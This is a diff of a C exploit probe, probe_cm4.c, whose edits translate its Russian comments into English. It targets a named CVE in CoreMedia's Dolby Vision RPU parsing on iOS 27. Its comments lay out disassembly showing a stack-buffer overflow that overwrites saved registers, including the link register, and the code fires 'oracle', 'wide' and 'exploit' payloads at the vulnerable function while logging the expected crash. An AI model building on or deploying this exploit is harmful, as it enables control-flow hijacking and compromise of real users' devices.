@@ -1,19 +1,19 @@
-// probe_cm4.c — CVE-2026-112688 через ПРАВИЛЬНЫЙ путь и с замером последствий.
+// probe_cm4.c - CVE-2026-112688 through the REAL entry point, measuring the consequences.
 //
-// Статика (CoreMedia 24A446, _CMGetDMVersionLevelFromRPU @ 0x18efbf940):
-//     stp x20,x19,[sp,#0x10]  /  stp x29,x30,[sp,#0x20]   ; сохранённые регистры
+// Static facts (CoreMedia 24A446, _CMGetDMVersionLevelFromRPU @ 0x18efbf940):
+//     stp x20,x19,[sp,#0x10]  /  stp x29,x30,[sp,#0x20]   ; saved registers
 //     sub sp, sp, #0x7000
-//     sub sp, sp, #0x3c0                                  ; кадр 0x73c0
-//     add x0, sp, #0xc ; mov w1, #0x73b4 ; bl memset      ; структура sp+0xc..sp+0x73c0
+//     sub sp, sp, #0x3c0                                  ; frame 0x73c0
+//     add x0, sp, #0xc ; mov w1, #0x73b4 ; bl memset      ; structure sp+0xc..sp+0x73c0
 //     bl _FigHEVCBridge_GetRPUMetadata(x1=bytes, x2=sp+0xc)
 //
-// ⇒ буфер кончается РОВНО на границе кадра, сразу за ним — x19/x20 и x29/x30.
-// Значит переполнение массива A (запись на struct+0x73b4+n) затирает
-// сохранённые регистры, включая LR. Это и есть примитив.
+// => the buffer ends EXACTLY at the frame boundary, and x19/x20 plus x29/x30 sit right
+// behind it. So overflowing array A (store at struct+0x73b4+n) overwrites the saved
+// registers, including LR. That is the primitive.
 //
-// ABI: функция принимает CFDataRef (1 аргумент) — проверено дизассемблером:
-// x0 проверяется на NULL, затем CFDataGetBytePtr/CFDataGetLength.
-// Вариант с 4 аргументами (bytes,len,*ver,*lvl) из референса — НЕВЕРЕН для iOS 27.
+// ABI: the function takes a CFDataRef (one argument) - confirmed by disassembly:
+// x0 is checked for NULL, then CFDataGetBytePtr/CFDataGetLength.
+// The 4-argument variant (bytes,len,*ver,*lvl) from the reference is WRONG for iOS 27.
 #include "rpu_payloads.h"
 
 typedef unsigned long size_t;
@@ -50,7 +50,7 @@ typedef CFDataRef (*cfcreate_t)(const void *, const unsigned char *, long);
 typedef void (*cfrelease_t)(const void *);
 typedef i32 (*rpu1_fn)(CFDataRef);
 
-// «шум» на стеке: если LR/FP затрут, мы это увидим как расхождение
+// stack noise: if LR/FP get overwritten we see it as a mismatch
 #define CANARY 0xC0FFEE1234567890ULL
 static unsigned long long g_canary_before;
 static unsigned long long g_canary_after;
@@ -97,12 +97,12 @@ int main(void) {
     call_payload(fn, mk, rel, "v1_oracle", rpu_v1_oracle, rpu_v1_oracle_len);
     log_str("cm4: canary_after_oracle="); log_dec(g_canary_before == CANARY); log_str("\n");
 
-    // расширенная ветка: gate >= 0x13 -> записи +8..+0x16, должны достать x30
+    // extended branch: gate >= 0x13 -> stores +8..+0x16, expected to reach x30
     log_str("cm4: about to smash via wide branch\n");
     call_payload(fn, mk, rel, "v1_wide", rpu_v1_wide, rpu_v1_wide_len);
     log_str("cm4: survived wide (branch not taken?)\n");
 
-    // здесь ожидается smash сохранённых регистров -> падение на retab
+    // saved registers are expected to be smashed here -> crash at retab
     log_str("cm4: about to smash (exploit payload)\n");
     call_payload(fn, mk, rel, "v1_exploit", rpu_v1_exploit, rpu_v1_exploit_len);
 
